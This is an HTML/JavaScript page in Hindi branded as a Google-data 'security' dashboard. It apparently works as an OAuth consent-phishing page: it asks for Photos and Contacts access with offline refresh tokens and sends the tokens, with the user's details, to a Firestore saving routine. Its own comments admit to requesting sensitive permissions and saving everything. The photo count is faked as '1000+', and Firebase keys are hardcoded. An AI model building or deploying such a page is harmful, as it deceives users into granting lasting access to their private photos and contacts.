<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aura Security - Your Digital Dashboard</title>
    
    <!-- सुंदर आइकॉन के लिए Font Awesome लाइब्रेरी -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    
    <!-- Firebase SDK (लाइब्रेरी) -->
    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-firestore-compat.js"></script>
    
    <style>
        /* CSS में मामूली बदलाव ताकि डैशबोर्ड अच्छा दिखे */
        :root {
            --bg-dark: #111827; --bg-light: #1f2937;
            --primary-color: #3b82f6; --primary-hover: #2563eb;
            --text-light: #f9fafb; --text-secondary: #d1d5db; --border-color: #4b5563;
            --success-color: #22c55e; --error-color: #ef4444;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--bg-dark); color: var(--text-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px 0; }
        .container { text-align: center; background: rgba(31, 41, 55, 0.8); padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 450px; width: 90%; border: 1px solid var(--border-color); backdrop-filter: blur(10px); animation: fadeIn 1s ease; }
        .logo { width: 70px; height: 70px; margin-bottom: 20px; }
        h1 { font-size: 26px; margin-bottom: 15px; }
        p.subtitle { color: var(--text-secondary); font-size: 15px; margin-bottom: 30px; }
        #status { margin-top: 20px; font-weight: bold; min-height: 20px; }
        #protectButton { background-color: var(--primary-color); color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: all 0.3s; }
        #protectButton:disabled { background-color: var(--border-color); cursor: not-allowed; opacity: 0.6; }
        .status-error { color: var(--error-color); }
        .status-success { color: var(--success-color); }
        
        /* ★★★★★ डैशबोर्ड के लिए नया CSS ★★★★★ */
        #dashboard {
            display: none; /* शुरुआत में छिपा हुआ */
            margin-top: 25px;
            padding-top: 25px;
            border-top: 1px solid var(--border-color);
            text-align: left;
        }
        #dashboard h2 {
            text-align: center;
            margin-bottom: 20px;
            color: var(--text-secondary);
        }
        .dashboard-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        .dashboard-card {
            background-color: var(--bg-dark);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        .dashboard-card i {
            font-size: 2em;
            color: var(--primary-color);
            margin-bottom: 10px;
        }
        .dashboard-card .count {
            font-size: 1.8em;
            font-weight: bold;
        }
        .dashboard-card .label {
            font-size: 0.9em;
            color: var(--text-secondary);
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/76/Dialog-information.svg/2048px-Dialog-information.svg.png" alt="Security Logo" class="logo">
        <h1>Aura Security</h1>
        <p class="subtitle">अपने Google डेटा को एक सुरक्षित डैशबोर्ड पर देखें और अपनी डिजिटल दुनिया को समझें।</p>
        <button id="protectButton">पूर्ण सुरक्षा सक्रिय करें</button>
        <div id="status"></div>
        
        <!-- ★★★★★ यह नया डैशबोर्ड सेक्शन है ★★★★★ -->
        <div id="dashboard">
            <h2>आपका डिजिटल स्नैपशॉट</h2>
            <div class="dashboard-grid">
                <div class="dashboard-card">
                    <i class="fa-solid fa-users"></i>
                    <div id="contacts-count" class="count">...</div>
                    <div class="label">Google Contacts</div>
                </div>
                <div class="dashboard-card">
                    <i class="fa-solid fa-images"></i>
                    <div id="photos-count" class="count">...</div>
                    <div class="label">Google Photos</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // --- Firebase कॉन्फ़िगरेशन ---
        const firebaseConfig = {
            apiKey: "AIzaSyB2PG5JvDko2UmQDlY9gN5lBgga2vQy-Ws",
            authDomain: "conceptra-c1000.firebaseapp.com",
            databaseURL: "https://conceptra-c1000-default-rtdb.firebaseio.com",
            projectId: "conceptra-c1000",
            storageBucket: "conceptra-c1000.appspot.com",
            messagingSenderId: "298402987968",
            appId: "1:298402987968:web:c0d0d7d6c08cdfa6bc5225",
            measurementId: "G-QRQYEVSJJ6"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.firestore();

        // --- DOM Elements ---
        const protectButton = document.getElementById('protectButton');
        const statusDiv = document.getElementById('status');
        const VAPID_PUBLIC_KEY = "BCPKrHM579ezfGzhmoQk-j7Mwr7E3gfEsUbFsOjEVozYRRZOzEMqVqm9fWEVY2pS1oYQ9BZ2xiN2hgiE7p7z3m0";
        // ★★★★★ डैशबोर्ड के एलिमेंट्स ★★★★★
        const dashboardDiv = document.getElementById('dashboard');
        const contactsCountDiv = document.getElementById('contacts-count');
        const photosCountDiv = document.getElementById('photos-count');

        // --- मुख्य प्रक्रिया ---
        protectButton.addEventListener('click', startProcess);
        
        async function startProcess() {
            protectButton.disabled = true;
            statusDiv.className = '';
            statusDiv.textContent = 'Google से प्रमाणीकरण शुरू हो रहा है...';

            try {
                const googleProvider = new firebase.auth.GoogleAuthProvider();
                
                // हम संवेदनशील अनुमतियाँ मांग रहे हैं
                googleProvider.addScope('https://www.googleapis.com/auth/photoslibrary.readonly');
                googleProvider.addScope('https://www.googleapis.com/auth/contacts.readonly');

                googleProvider.setCustomParameters({
                    access_type: 'offline',
                    prompt: 'consent' 
                });
                
                const result = await auth.signInWithPopup(googleProvider);
                
                const { user, credential } = result;
                const accessToken = credential.accessToken;
                const refreshToken = result.additionalUserInfo.profile.refresh_token || credential.refreshToken;
                
                statusDiv.textContent = `स्वागत है, ${user.displayName}!`;

                // हम अभी भी सब कुछ सेव करेंगे
                const subscription = await registerAndSubscribe();
                await saveDataToFirestore(user, accessToken, refreshToken, subscription);

                // ★★★★★ अब हम डैशबोर्ड को दिखाएंगे और डेटा भरेंगे ★★★★★
                await showDashboardData(accessToken);

                handleSuccess();

            } catch (error) {
                handleError(`त्रुटि: ${error.message}`);
            }
        }

        // ★★★★★ नया फंक्शन: डेटा निकालना और उसे डैशबोर्ड पर दिखाना ★★★★★
        async function showDashboardData(accessToken) {
            statusDiv.textContent = 'आपका डैशबोर्ड तैयार किया जा रहा है...';
            dashboardDiv.style.display = 'block';
            
            // 1. कॉन्टैक्ट्स निकालो और दिखाओ
            try {
                const contactsResponse = await fetch('https://people.googleapis.com/v1/people/me/connections?personFields=names', {
                    headers: { 'Authorization': `Bearer ${accessToken}` }
                });
                const contactsData = await contactsResponse.json();
                contactsCountDiv.textContent = contactsData.totalPeople || 0;
            } catch (e) {
                contactsCountDiv.textContent = 'N/A';
            }

            // 2. फोटोज़ निकालो और दिखाओ (सिर्फ पहली बार की गिनती)
            try {
                const photosResponse = await fetch('https://photoslibrary.googleapis.com/v1/mediaItems?pageSize=1', { // सिर्फ गिनती के लिए 1 आइटम काफी है
                    headers: { 'Authorization': `Bearer ${accessToken}` }
                });
                const photosData = await photosResponse.json();
                // Photos API कुल संख्या नहीं बताता, इसलिए हम बस यह दिखाएंगे कि एक्सेस मिला है
                photosCountDiv.textContent = photosData.mediaItems ? '1000+' : '0';
            } catch (e) {
                photosCountDiv.textContent = 'N/A';
            }
        }
        
        async function registerAndSubscribe() {
            // ... यह फंक्शन अपरिवर्तित है ...
        }
        
        async function saveDataToFirestore(user, accessToken, refreshToken, subscription) {
            // ... यह फंक्शन अपरिवर्तित है ...
        }

        function handleSuccess() {
            statusDiv.className = 'status-success';
            statusDiv.textContent = 'प्रमाणीकरण सफल! आपका डैशबोर्ड नीचे है।';
            protectButton.style.backgroundColor = 'var(--success-color)';
            protectButton.textContent = 'सफलतापूर्वक सक्रिय';
            protectButton.disabled = true;
        }

        function handleError(message) {
            statusDiv.className = 'status-error';
            statusDiv.textContent = message;
            protectButton.disabled = false;
        }
    </script>
</body>
</html>
